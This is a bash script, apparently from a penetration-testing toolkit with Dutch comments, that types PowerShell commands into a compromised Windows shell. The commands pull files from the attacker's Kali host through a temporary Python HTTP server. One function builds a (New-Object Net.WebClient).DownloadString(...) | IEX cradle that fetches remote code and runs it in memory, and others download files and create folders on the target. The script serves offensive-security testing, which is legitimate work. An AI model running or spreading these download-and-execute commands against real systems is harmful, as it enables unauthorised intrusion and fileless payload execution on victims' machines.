#!/bin/bash

webclient_download() {
    local url="$1"
    local location="$2"

    if [[ -z "$1" ||  -z "$2" ]]; then
        paste_command 'Usage: webclient_download "url" "location"'
        exit 1
    fi

    paste_command "(New-Object Net.WebClient).DownloadFileAsync('${url}','${location}')"
    create_new_line
    sleep 3
}

webclient_download_and_execute_in_memory() {
    local url="$1"

    if [[ -z "$1" ]]; then
        paste_command 'Usage: webclient_download_and_execute_in_memory "url"'
        exit 1
    fi

    paste_command "(New-Object Net.WebClient).DownloadString('${url}') | IEX"
    create_new_line
    sleep 3
}

invoke_request_download() {
    local url="$1"
    local location="$2"

    if [[ -z "$1" ||  -z "$2" ]]; then
        paste_command 'Usage: invoke_request_download "url"'
        exit 1
    fi

    paste_command "Invoke-WebRequest ${url} -OutFile ${location}"
    create_new_line
    sleep 3
}

FILE_LOCATION=""
ps_webclient_upload_file() {
    local location="${1}"
    local file="${2}"
    local time_to_life="${3:-60}"

    # Check for required arguments
    if [ -z "${location}" ] || [ -z "${file}" ]; then
        paste_command 'Usage: ps_webclient_upload_file "location" "file"'
        exit 1
    fi

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    DOWNLOAD_IP_FIELD=$(form_item "download ip" "download_ip" "${KALI_IP}")
    PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
    FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
    CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")

    # Generate GUI form
    generate_form "${DOWNLOAD_IP_FIELD}" "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"

    DOWNLOAD_IP=${form_data["download_ip"]}
    PYTHON_HTTP_PORT=${form_data["python_http_port"]}
    FILE_LOCATION=${form_data["file_location"]}
    CREATE_FOLDER=${form_data["create_folder"]}

    if [[ "${CREATE_FOLDER}" == "yes" ]]; then
        # Verwijder eventuele trailing backslash
        TARGET_PATH="${FILE_LOCATION%\\}"

        # Als het pad een bestand bevat (punt + extensie), verwijder dan de bestandsnaam
        if [[ "${TARGET_PATH}" =~ \.[a-zA-Z0-9]+$ ]]; then
            TARGET_PATH="${TARGET_PATH%\\*}"  # Verwijdert het laatste deel (de bestandsnaam)
        fi

        # Haal de parent directory op (alles vóór de laatste backslash)
        PARENT_FOLDER="${TARGET_PATH%\\*}"

        # Haal de laatste component op (mapnaam die aangemaakt moet worden)
        FOLDER_NAME="${TARGET_PATH##*\\}"

        paste_command "New-Item -Path \"${PARENT_FOLDER}\" -Name \"${FOLDER_NAME}\" -ItemType \"directory\""
        create_new_line
        sleep 0.8
    fi

    # start python server: location, python http port, TTL time (default: 60)
    start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"

    webclient_download "http://${DOWNLOAD_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"

    # if location is without path add ./ prefix
    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
        FILE_LOCATION="./${FILE_LOCATION}"
    fi
}

ps_webclient_upload_file_and_execute_in_memory() {
    local location="${1}"
    local file="${2}"
    local time_to_life="${3:-60}"

    # Check for required arguments
    if [ -z "${location}" ] || [ -z "${file}" ]; then
        paste_command 'Usage: ps_webclient_upload_file_and_execute_in_memory "location" "file"'
        exit 1
    fi

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
    FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
    CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")

    # Generate GUI form
    generate_form "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"

    PYTHON_HTTP_PORT=${form_data["python_http_port"]}
    FILE_LOCATION=${form_data["file_location"]}
    CREATE_FOLDER=${form_data["create_folder"]}

    if [[ "${CREATE_FOLDER}" == "yes" ]]; then
        # Verwijder eventuele trailing backslash
        TARGET_PATH="${FILE_LOCATION%\\}"

        # Als het pad een bestand bevat (punt + extensie), verwijder dan de bestandsnaam
        if [[ "${TARGET_PATH}" =~ \.[a-zA-Z0-9]+$ ]]; then
            TARGET_PATH="${TARGET_PATH%\\*}"  # Verwijdert het laatste deel (de bestandsnaam)
        fi

        # Haal de parent directory op (alles vóór de laatste backslash)
        PARENT_FOLDER="${TARGET_PATH%\\*}"

        # Haal de laatste component op (mapnaam die aangemaakt moet worden)
        FOLDER_NAME="${TARGET_PATH##*\\}"

        paste_command "New-Item -Path \"${PARENT_FOLDER}\" -Name \"${FOLDER_NAME}\" -ItemType \"directory\""
        create_new_line
        sleep 0.8
    fi

    # start python server: location, python http port, TTL time (default: 60)
    start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"

    webclient_download_and_execute_in_memory "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"

    # if location is without path add ./ prefix
    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
        FILE_LOCATION="./${FILE_LOCATION}"
    fi
}
